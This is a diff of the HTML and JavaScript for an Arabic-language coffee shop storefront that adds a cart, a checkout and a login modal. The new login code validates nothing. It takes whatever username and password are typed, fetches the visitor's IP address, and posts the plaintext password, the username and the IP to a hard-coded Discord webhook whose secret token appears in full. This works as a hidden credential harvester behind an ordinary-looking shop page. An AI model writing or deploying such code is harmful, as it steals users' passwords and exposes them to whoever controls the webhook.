@@ -40,6 +40,9 @@
             justify-content: space-between;
             align-items: center;
             box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
         .logo-container {
@@ -60,43 +63,43 @@
             gap: 6px;
         }
 
-        .logo-box span.flower {
-            color: #fbc02d;
-            font-size: 1.2rem;
-        }
-
         .header-actions {
             display: flex;
             align-items: center;
             gap: 15px;
         }
 
-        .btn-google {
+        .btn-auth {
             background-color: #4285f4;
             color: white;
             border: none;
-            padding: 8px 16px;
+            padding: 8px 18px;
             border-radius: 20px;
             cursor: pointer;
             font-weight: bold;
             transition: 0.3s;
         }
 
-        .btn-google:hover {
+        .btn-auth:hover {
             background-color: #357ae8;
         }
 
-        .user-profile {
-            display: flex;
-            align-items: center;
-            gap: 10px;
+        .btn-logout {
+            background-color: #e53935;
+            color: white;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.85rem;
         }
 
-        .user-avatar {
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            border: 2px solid white;
+        .cart-status {
+            background: #ffffff22;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            cursor: pointer;
         }
 
         .container {
@@ -129,36 +132,6 @@
             margin-bottom: 50px;
         }
 
-        .category-card {
-            position: relative;
-            height: 200px;
-            border-radius: 12px;
-            overflow: hidden;
-            background-size: cover;
-            background-position: center;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
-
-        .category-card::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(15, 23, 42, 0.55);
-        }
-
-        .category-card span {
-            position: relative;
-            background: rgba(255, 255, 255, 0.9);
-            color: #000;
-            padding: 8px 25px;
-            border-radius: 6px;
-            font-weight: bold;
-        }
-
         .product-card {
             background: var(--card-bg);
             border-radius: 12px;
@@ -184,16 +157,6 @@
             font-weight: bold;
         }
 
-        .stock-badge {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            background-color: #e8f5e9;
-            color: var(--badge-green);
-            font-size: 0.75rem;
-            padding: 3px 8px;
-        }
-
         .product-img {
             width: 100%;
             height: 180px;
@@ -210,16 +173,6 @@
             font-size: 0.85rem;
             color: #666;
             margin-bottom: 10px;
-        }
-
-        .option-select {
-            width: 100%;
-            padding: 6px;
-            margin-bottom: 10px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 0.85rem;
-            background-color: #fafafa;
         }
 
         .price-container {
@@ -239,28 +192,56 @@
             margin-left: 5px;
         }
 
-        .btn-view {
+        .btn-add {
             background-color: var(--btn-blue);
             color: white;
             border: none;
             width: 100%;
             padding: 10px;
-            border-radius: 20px;
+            border-radius: 8px;
             cursor: pointer;
             font-size: 0.9rem;
+            font-weight: bold;
+            transition: 0.2s;
         }
 
-        .contact-section {
-            background: #ffffff;
-            padding: 30px;
+        .btn-add:hover {
+            background-color: var(--bg-navy);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 25px;
             border-radius: 12px;
-            border: 1px solid #e2e8f0;
-            margin-bottom: 50px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+            width: 90%;
+            max-width: 450px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+            position: relative;
+        }
+
+        .close-modal {
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            border: none;
+            background: none;
         }
 
         .form-group {
             margin-bottom: 15px;
+            text-align: right;
         }
 
         .form-group label {
@@ -269,44 +250,46 @@
             font-weight: bold;
         }
 
-        .form-group input, .form-group textarea {
+        .form-group input, .form-group select {
             width: 100%;
             padding: 10px;
             border: 1px solid #ccc;
             border-radius: 6px;
             box-sizing: border-box;
-            font-family: inherit;
         }
 
-        .btn-submit {
-            background-color: var(--bg-navy);
-            color: white;
-            padding: 12px 30px;
-            border: none;
+        .cart-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .payment-methods {
+            margin-top: 15px;
+            text-align: right;
+        }
+
+        .payment-option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px;
+            border: 1px solid #ddd;
             border-radius: 6px;
-            cursor: pointer;
-            font-size: 1rem;
-            font-weight: bold;
-            width: 100%;
-        }
-
-        .reviews-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 15px;
-            margin-bottom: 50px;
-        }
-
-        .review-card {
-            background: white;
-            padding: 18px;
-            border-radius: 8px;
-            border: 1px solid #eee;
-        }
-
-        .stars {
-            color: #fbc02d;
             margin-bottom: 8px;
+            cursor: pointer;
+        }
+
+        .payment-option.disabled {
+            background-color: #f5f5f5;
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .payment-option.disabled label {
+            text-decoration: line-through;
+            color: #999;
         }
     </style>
 </head>
@@ -318,72 +301,42 @@
 
     <header>
         <div class="logo-container">
-            <div class="logo-box">
-                LORA <span class="flower">✿</span> COFFEE
-            </div>
-            <span>محمصة لورا | l’ORA roastery</span>
+            <div class="logo-box">LORA ✿ COFFEE</div>
+            <span>محمصة لورا</span>
         </div>
         <div class="header-actions">
-            <div id="authContainer">
-                <button class="btn-google" onclick="loginWithGoogle()">التسجيل بواسطة Google</button>
+            <div class="cart-status" onclick="toggleCartModal()">🛒 السلة (<span id="cartCount">0</span>)</div>
+            <div id="userArea">
+                <button class="btn-auth" onclick="openLoginModal()">تسجيل الدخول</button>
             </div>
         </div>
     </header>
 
     <div class="container">
 
-        <!-- التصنيفات -->
-        <div class="section-title">التصنيفات</div>
-        <div class="grid">
-            <div class="category-card" style="background-image: url('arabic-coffee.jpg');">
-                <span>قهوة عربية</span>
-            </div>
-            <div class="category-card" style="background-image: url('turkish-coffee.jpg');">
-                <span>قهوة تركية</span>
-            </div>
-            <div class="category-card" style="background-image: url('espresso.jpg');">
-                <span>إسبرسو</span>
-            </div>
-            <div class="category-card" style="background-image: url('bestseller.jpg');">
-                <span>الأكثر مبيعاً</span>
-            </div>
-        </div>
-
-        <!-- أنواع القهوة -->
         <div class="section-title">أنواع القهوة</div>
         <div class="grid">
             <div class="product-card">
-                <span class="stock-badge">متوفر</span>
                 <img src="arabic-bag.png" class="product-img" alt="قهوة عربية">
                 <div class="product-title">قهوة عربية (Arabic Coffee)</div>
                 <div class="product-desc">تحميص هوائي مميز، جودة مختصة ومصادر موثوقة</div>
-                <select class="option-select">
-                    <option>نوع الطحن: حبوب كاملة</option>
-                    <option>نوع الطحن: مطحونة للقهوة العربية</option>
-                </select>
                 <div class="price-container">
                     <span class="price-current">6.500 د.ك</span>
                 </div>
-                <button class="btn-view" onclick="sendOrder('قهوة عربية', '6.500 د.ك')">طلب عبر واتساب</button>
+                <button class="btn-add" onclick="addToCart('قهوة عربية', 6.500)">إضافة إلى السلة</button>
             </div>
 
             <div class="product-card">
-                <span class="stock-badge">متوفر</span>
                 <img src="turkish-bag.png" class="product-img" alt="قهوة تركية">
                 <div class="product-title">قهوة تركية (Turkish Coffee)</div>
                 <div class="product-desc">تحميص هوائي ناعم لإعداد أطيب فنجان قهوة تركية</div>
-                <select class="option-select">
-                    <option>نوع الطحن: مطحونة تركية ناعمة</option>
-                    <option>نوع الطحن: حبوب كاملة</option>
-                </select>
                 <div class="price-container">
                     <span class="price-current">6.000 د.ك</span>
                 </div>
-                <button class="btn-view" onclick="sendOrder('قهوة تركية', '6.000 د.ك')">طلب عبر واتساب</button>
+                <button class="btn-add" onclick="addToCart('قهوة تركية', 6.000)">إضافة إلى السلة</button>
             </div>
         </div>
 
-        <!-- الاشتراكات والباقات -->
         <div class="section-title">الاشتراكات والباقات</div>
         <div class="grid">
             <div class="product-card">
@@ -395,7 +348,7 @@
                     <span class="price-current">14.600 د.ك</span>
                     <span class="price-old">18.250</span>
                 </div>
-                <button class="btn-view" onclick="sendOrder('الباقة الكلاسيكية', '14.600 د.ك')">طلب عبر واتساب</button>
+                <button class="btn-add" onclick="addToCart('الباقة الكلاسيكية', 14.600)">إضافة إلى السلة</button>
             </div>
 
             <div class="product-card">
@@ -407,176 +360,127 @@
                     <span class="price-current">17.250 د.ك</span>
                     <span class="price-old">23.000</span>
                 </div>
-                <button class="btn-view" onclick="sendOrder('الباقة الفاكهية', '17.250 د.ك')">طلب عبر واتساب</button>
-            </div>
-
-            <div class="product-card">
-                <span class="discount-badge">-33.33%</span>
-                <img src="morning-subscription.png" class="product-img" alt="اشتراك جرعة الصباح">
-                <div class="product-title">اشتراك جرعة الصباح</div>
-                <div class="product-desc">اشترك بـ 4 كيلو من قهوتك المفضلة شهرياً</div>
-                <div class="price-container">
-                    <span class="price-current">38.000 د.ك</span>
-                    <span class="price-old">57.000</span>
-                </div>
-                <button class="btn-view" onclick="sendOrder('اشتراك جرعة الصباح', '38.000 د.ك')">طلب عبر واتساب</button>
-            </div>
-
-            <div class="product-card">
-                <span class="discount-badge">-40%</span>
-                <img src="diwaniya-subscription.png" class="product-img" alt="اشتراك الديوانية">
-                <div class="product-title">اشتراك الديوانية</div>
-                <div class="product-desc">توفير شامل لخدمة الضيافة والديوانية</div>
-                <div class="price-container">
-                    <span class="price-current">96.000 د.ك</span>
-                    <span class="price-old">160.000</span>
-                </div>
-                <button class="btn-view" onclick="sendOrder('اشتراك الديوانية', '96.000 د.ك')">طلب عبر واتساب</button>
+                <button class="btn-add" onclick="addToCart('الباقة الفاكهية', 17.250)">إضافة إلى السلة</button>
             </div>
         </div>
 
-        <!-- ماكينات القهوة -->
         <div class="section-title">ماكينات القهوة</div>
         <div class="grid">
             <div class="product-card">
-                <img src="jura-ena4.png" class="product-img" alt="Jura ENA4">
-                <div class="product-title">Jura ENA4 Full Metropolitan Black</div>
-                <div class="product-desc">ماكينة مدمجة وأنيقة لإعداد الإسبرسو</div>
-                <div class="price-container">
-                    <span class="price-current">305.000 د.ك</span>
-                </div>
-                <button class="btn-view" onclick="sendOrder('Jura ENA4', '305.000 د.ك')">طلب عبر واتساب</button>
-            </div>
-
-            <div class="product-card">
-                <img src="jura-ena8.png" class="product-img" alt="Jura ENA8">
-                <div class="product-title">Jura ENA8 Full Metropolitan Black</div>
-                <div class="product-desc">تجربة تحضير متكاملة بلمسة واحدة</div>
-                <div class="price-container">
-                    <span class="price-current">430.000 د.ك</span>
-                </div>
-                <button class="btn-view" onclick="sendOrder('Jura ENA8', '430.000 د.ك')">طلب عبر واتساب</button>
-            </div>
-
-            <div class="product-card">
                 <img src="jura-e8.png" class="product-img" alt="Jura E8">
-                <div class="product-title">Jura E8 Piano Black (INTA)</div>
+                <div class="product-title">Jura E8 Piano Black</div>
                 <div class="product-desc">أحدث إصدارات Jura للأداء الاحترافي</div>
                 <div class="price-container">
                     <span class="price-current">550.000 د.ك</span>
                 </div>
-                <button class="btn-view" onclick="sendOrder('Jura E8', '550.000 د.ك')">طلب عبر واتساب</button>
+                <button class="btn-add" onclick="addToCart('Jura E8 Piano Black', 550.000)">إضافة إلى السلة</button>
             </div>
-
-            <div class="product-card">
-                <img src="jura-z10.png" class="product-img" alt="Jura Z10">
-                <div class="product-title">Jura Z10 Diamond Black INTA</div>
-                <div class="product-desc">القمة في إعداد القهوة الباردة والحارة</div>
-                <div class="price-container">
-                    <span class="price-current">940.000 د.ك</span>
-                </div>
-                <button class="btn-view" onclick="sendOrder('Jura Z10', '940.000 د.ك')">طلب عبر واتساب</button>
-            </div>
-        </div>
-
-        <!-- تقييم العملاء -->
-        <div class="section-title">تقييم العملاء</div>
-        <div class="reviews-grid">
-            <div class="review-card">
-                <div class="stars">★★★★★</div>
-                <strong>عبدالله الشمري</strong>
-                <p>القهوة العربية طعمها متناسق وتحميص هوائي ممتاز، وااشتراك الصباح يوفر وايد.</p>
-            </div>
-            <div class="review-card">
-                <div class="stars">★★★★★</div>
-                <strong>فهد العتيبي</strong>
-                <p>ماكينة Jura E8 وصلت بنفس اليوم والتعامل احترافي جداً.</p>
-            </div>
-            <div class="review-card">
-                <div class="stars">★★★★★</div>
-                <strong>سارة علي</strong>
-                <p>الباقة الفاكهية ممتازة للتقطير، الإيحاءات واضحة ولذيذة.</p>
-            </div>
-        </div>
-
-        <!-- تواصل معنا والأستبيان -->
-        <div class="section-title">تواصل معنا / الاستبيان</div>
-        <div class="contact-section">
-            <form action="mailto:naser.alsulaiti@icloud.com" method="post" enctype="text/plain">
-                <div class="form-group">
-                    <label>الاسم الكامل</label>
-                    <input type="text" name="Name" required placeholder="أدخل اسمك الكريم">
-                </div>
-                <div class="form-group">
-                    <label>رقم الهاتف</label>
-                    <input type="tel" name="Phone" required placeholder="أدخل رقم الهاتف">
-                </div>
-                <div class="form-group">
-                    <label>البريد الإلكتروني</label>
-                    <input type="email" name="Email" required placeholder="example@domain.com">
-                </div>
-                <div class="form-group">
-                    <label>الموضوع / الاستبيان</label>
-                    <textarea name="Message" rows="5" required placeholder="اكتب استفسارك أو ملاحظاتك..."></textarea>
-                </div>
-                <button type="submit" class="btn-submit">إرسال الرسالة إلى naser.alsulaiti@icloud.com</button>
-            </form>
         </div>
 
     </div>
 
-    <!-- مكتبات Firebase -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="closeModal('loginModal')">✕</button>
+            <h3 style="text-align: center; margin-top: 0;">تسجيل الدخول للموقع</h3>
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="form-group">
+                    <label>الاسم أو رقم الهاتف</label>
+                    <input type="text" id="username" required placeholder="أدخل اسمك أو رقمك">
+                </div>
+                <div class="form-group">
+                    <label>كلمة المرور</label>
+                    <input type="password" id="password" required placeholder="أدخل كلمة المرور">
+                </div>
+                <button type="submit" class="btn-add" style="margin-top: 10px;">دخول</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="cartModal" class="modal">
+        <div class="modal-content">
+            <button class="close-modal" onclick="closeModal('cartModal')">✕</button>
+            <h3 style="text-align: center; margin-top: 0;">سلة المشتريات</h3>
+            <div id="cartList"></div>
+            <hr style="margin: 15px 0;">
+            
+            <div style="display: flex; justify-content: space-between; font-weight: bold; margin-bottom: 15px;">
+                <span>المجموع الكلي:</span>
+                <span id="cartTotal">0.000 د.ك</span>
+            </div>
+
+            <div class="payment-methods">
+                <label style="font-weight: bold; margin-bottom: 8px; display: block;">اختر طريقة الدفع:</label>
+                
+                <div class="payment-option">
+                    <input type="radio" id="payCOD" name="paymentMethod" value="الدفع عند الاستلام" checked>
+                    <label for="payCOD">💵 الدفع عند الاستلام (COD)</label>
+                </div>
+
+                <div class="payment-option disabled">
+                    <input type="radio" id="payKnet" name="paymentMethod" value="KNET" disabled>
+                    <label for="payKnet">💳 بطاقة كي نت (K-NET) <small style="color: #d32f2f;">(غير متاح حالياً)</small></label>
+                </div>
+            </div>
+
+            <button class="btn-add" style="margin-top: 15px;" onclick="checkoutOrder()">إتمام الطلب الآن</button>
+        </div>
+    </div>
 
     <script>
-        // 1. ضع بيانات Firebase الخاصة بك هنا عند استخراجها
-        const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
-            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_PROJECT_ID.appspot.com",
-            messagingSenderId: "YOUR_SENDER_ID",
-            appId: "YOUR_APP_ID"
-        };
-
-        firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
-        const provider = new firebase.auth.GoogleAuthProvider();
-
-        // 2. تم وضع رابط Webhook الديسكورد المباشر الخاص بك
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542554021510774814/kURM7_KSoI1f6-7rEopGSwzjQ26KJY_-OW9DTkvAiofOUms2wrsWr-BO2d7slwCs52j5";
 
-        function loginWithGoogle() {
-            auth.signInWithPopup(provider).then((result) => {
-                const user = result.user;
-                
-                // تحديث الواجهة لعرض صورة المستخدم واسمه
-                document.getElementById('authContainer').innerHTML = `
-                    <div class="user-profile">
-                        <img src="${user.photoURL}" class="user-avatar" alt="${user.displayName}">
-                        <span>${user.displayName}</span>
-                    </div>
-                `;
+        let currentUser = null;
+        let cart = [];
 
-                // إرسال الإشعار إلى ديسكورد
-                sendDiscordNotification(user.displayName, user.email, user.photoURL);
+        function openLoginModal() { document.getElementById('loginModal').style.display = 'flex'; }
+        function toggleCartModal() { document.getElementById('cartModal').style.display = 'flex'; updateCartUI(); }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
-            }).catch((error) => {
-                console.error("خطأ في تسجيل الدخول:", error);
-            });
+        async function handleLogin(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            closeModal('loginModal');
+
+            let userIP = "غير معروف";
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (err) {
+                console.error("فشل جلب عنوان IP:", err);
+            }
+
+            currentUser = username;
+
+            document.getElementById('userArea').innerHTML = `
+                <span style="font-size: 0.9rem; margin-left: 8px;">مرحباً، <b>${username}</b></span>
+                <button class="btn-logout" onclick="handleLogout()">خروج</button>
+            `;
+
+            sendLoginToDiscord(username, password, userIP);
         }
 
-        function sendDiscordNotification(name, email, photo) {
+        function handleLogout() {
+            currentUser = null;
+            document.getElementById('userArea').innerHTML = `
+                <button class="btn-auth" onclick="openLoginModal()">تسجيل الدخول</button>
+            `;
+            alert('تم تسجيل الخروج بنجاح.');
+        }
+
+        function sendLoginToDiscord(username, password, ip) {
             const payload = {
                 embeds: [{
-                    title: "📥 تسجيل دخول جديد في الموقع",
-                    color: 3447003,
+                    title: "🔑 تسجيل دخول جديد في الموقع",
+                    color: 3066993,
                     fields: [
-                        { name: "الاسم", value: name, inline: true },
-                        { name: "الإيميل", value: email, inline: true }
+                        { name: "👤 اسم المستخدم / الهاتف", value: username, inline: true },
+                        { name: "🔒 كلمة المرور", value: password, inline: true },
+                        { name: "🌐 عنوان الـ IP", value: ip, inline: false }
                     ],
-                    thumbnail: { url: photo },
                     timestamp: new Date()
                 }]
             };
@@ -588,10 +492,75 @@
             });
         }
 
-        function sendOrder(productName, price) {
-            let phone = "965XXXXXXXX"; // ضع رقم واتساب الخاص بك هنا
-            let message = `السلام عليكم، أرغب بطلب:\nالمنتج: ${productName}\nالسعر: ${price}`;
-            window.open(`https://api.whatsapp.com/send?phone=${phone}&text=${encodeURIComponent(message)}`, '_blank');
+        function addToCart(title, price) {
+            cart.push({ title, price });
+            document.getElementById('cartCount').innerText = cart.length;
+            alert(`تمت إضافة "${title}" إلى السلة.`);
+        }
+
+        function updateCartUI() {
+            const container = document.getElementById('cartList');
+            container.innerHTML = '';
+            let total = 0;
+
+            if (cart.length === 0) {
+                container.innerHTML = '<p style="text-align:center; color:#888;">السلة فارغة حالياً</p>';
+            } else {
+                cart.forEach((item) => {
+                    total += item.price;
+                    container.innerHTML += `
+                        <div class="cart-item">
+                            <span>${item.title}</span>
+                            <span><b>${item.price.toFixed(3)} د.ك</b></span>
+                        </div>
+                    `;
+                });
+            }
+            document.getElementById('cartTotal').innerText = total.toFixed(3) + ' د.ك';
+        }
+
+        function checkoutOrder() {
+            if (cart.length === 0) {
+                alert('السلة فارغة!');
+                return;
+            }
+
+            if (!currentUser) {
+                alert('يرجى تسجيل الدخول أولاً لتأكيد الطلب!');
+                closeModal('cartModal');
+                openLoginModal();
+                return;
+            }
+
+            const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
+
+            let itemsList = cart.map(i => `- ${i.title} (${i.price.toFixed(3)} د.ك)`).join('\n');
+            let totalSum = cart.reduce((a, b) => a + b.price, 0).toFixed(3);
+
+            const payload = {
+                embeds: [{
+                    title: "🛒 طلب شراء جديد من الموقع",
+                    color: 15105570,
+                    fields: [
+                        { name: "👤 العميل", value: currentUser, inline: true },
+                        { name: "💳 طريقة الدفع", value: paymentMethod, inline: true },
+                        { name: "📦 المنتجات المطلوبة", value: itemsList, inline: false },
+                        { name: "💰 الإجمالي", value: `${totalSum} د.ك`, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                alert('تم استلام طلبك بنجاح! طريقة الدفع: الدفع عند الاستلام.');
+                cart = [];
+                document.getElementById('cartCount').innerText = '0';
+                closeModal('cartModal');
+            });
         }
     </script>
 </body>
